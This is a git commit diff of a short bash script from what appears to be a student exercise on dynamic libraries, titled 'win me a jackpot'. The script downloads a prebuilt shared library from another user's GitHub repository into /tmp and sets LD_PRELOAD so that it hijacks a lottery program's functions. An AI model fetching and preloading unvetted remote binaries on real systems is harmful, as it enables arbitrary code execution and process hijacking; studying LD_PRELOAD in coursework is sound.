f9c949d72d504d9b16b917f5c683cdb2b5613c52
aelabassi <abderrazaq.elabassi@uit.ac.ma>
2024-01-15 07:42:52 -0800

    win me a jackpot

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
-wget -P /tmp https://github.com/aelabassi/alx-low_level_programming/blob/master/0x18-dynamic_libraries/libgiga.so
-export LD_PRELOAD=/tmp/libgiga.so
+wget -P /tmp https://github.com/eyoul/alx-low_level_programming/raw/main/0x18-dynamic_libraries/iwin.so
+export LD_PRELOAD=/tmp/iwin.so
 
